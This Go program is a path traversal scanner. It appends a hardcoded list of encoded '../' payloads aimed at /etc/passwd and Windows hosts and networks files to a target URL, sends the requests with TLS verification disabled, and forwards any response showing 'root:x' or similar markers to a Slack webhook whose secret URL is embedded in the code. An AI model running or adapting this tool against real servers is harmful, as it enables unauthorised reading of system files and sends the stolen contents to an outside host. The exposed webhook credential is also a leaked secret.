package main

import (
    "fmt"
    "os"
    "net/url"
    "net/http"
    "log"
    "net/http/httputil"
    "io/ioutil"
//    "strings"
    "time"
    "crypto/tls"
//    "bufio"
    "bytes"
    "encoding/json"
    "errors"


)

type SlackRequestBody struct {
    Text string `json:"text"`
}

func SendSlackNotification(webhookUrl string, msg string) error {

    slackBody, _ := json.Marshal(SlackRequestBody{Text: msg})
    req, err := http.NewRequest(http.MethodPost, webhookUrl, bytes.NewBuffer(slackBody))
    if err != nil {
        return err
    }

    req.Header.Add("Content-Type", "application/json")

    client := &http.Client{Timeout: 10 * time.Second}
    resp, err := client.Do(req)
    if err != nil {
        return err
    }

    buf := new(bytes.Buffer)
    buf.ReadFrom(resp.Body)
    if buf.String() != "ok" {
        return errors.New("Non-ok response returned from Slack")
    }
    return nil
}

func direct_tra(url1,cookie1 string){

         webhookUrl := "https://hooks.slack.com/services/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"
         http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
         client := &http.Client{}
         req, err := http.NewRequest("GET",url1, nil)
         req.Header.Add("Cookie", cookie1)

         res,err := client.Do(req)

         if err != nil{
            log.Fatal(err)
         }

         requestDump, err := httputil.DumpRequest(req, true)
         if err != nil {
              fmt.Println(err)
         }
         fmt.Println(string(requestDump))
         fmt.Println(url1,res.StatusCode)
         reqBody, err := ioutil.ReadAll(res.Body)
         if err != nil {
                          log.Fatal(err)
         }
         //fmt.Printf("%s", reqBody)
         if (bytes.Contains(reqBody, []byte("rhino.acme.com")))|| (bytes.Contains(reqBody, []byte("Microsoft Corp")))||(bytes.Contains(reqBody, []byte("root:x"))){
            text:=fmt.Sprintf("probable Directory Listing in %v \n %s", url1,reqBody)
            SendSlackNotification(webhookUrl,text)

         }



}

func main() {

               payloads := []string{"..%%252f..%%252f..%%252f..%%252f..%%252f..%%252f..%%252f..%%252fetc/passwd","..%%252f..%%252f..%%252f..%%252f..%%252f..%%252f..%%252f..%%252fwindows/system32/drivers/etc/hosts","..%%252f..%%252f..%%252f..%%252f..%%252f..%%252f..%%252f..%%252fwindows/system32/drivers/etc/networks","/..%%252f..%%252f..%%252f..%%252f..%%252f..%%252f..%%252f..%%252fetc/passwd","/..%%252f..%%252f..%%252f..%%252f..%%252f..%%252f..%%252f..%%252fwindows/system32/drivers/etc/hosts","/..%%252f..%%252f..%%252f..%%252f..%%252f..%%252f..%%252f..%%252fwindows/system32/drivers/etc/networks","//////etc/passwd","//////windows/system32/drivers/etc/networks","//////windows/system32/drivers/etc/hosts","../../../../../../../../../etc/passwd","../../../../../../../../../windows/system32/drivers/etc/networks","../../../../../../../../../windows/system32/drivers/etc/hosts","/../../../../../../../../../windows/system32/drivers/etc/hosts","/../../../../../../../../../windows/system32/drivers/etc/networks","/../../../../../../../../../etc/passwd","/../../../../../../../../../../../../../../etc/passwd","/../../../../../../../../../../../../../../windows/system32/drivers/etc/networks","/../../../../../../../../../../../../../../windows/system32/drivers/etc/hosts"}
               str := os.Args[1]
               cookie:=os.Args[2]
               u, _ := url.Parse(str)
               for _, payload := range payloads {

                     l:=fmt.Sprintf(u.Scheme+"://"+u.Host+u.Path+payload) 
                     if cookie == "1" {
                        direct_tra(l,"test")
                     }else{
                        direct_tra(l,cookie)
                     }
               }

}
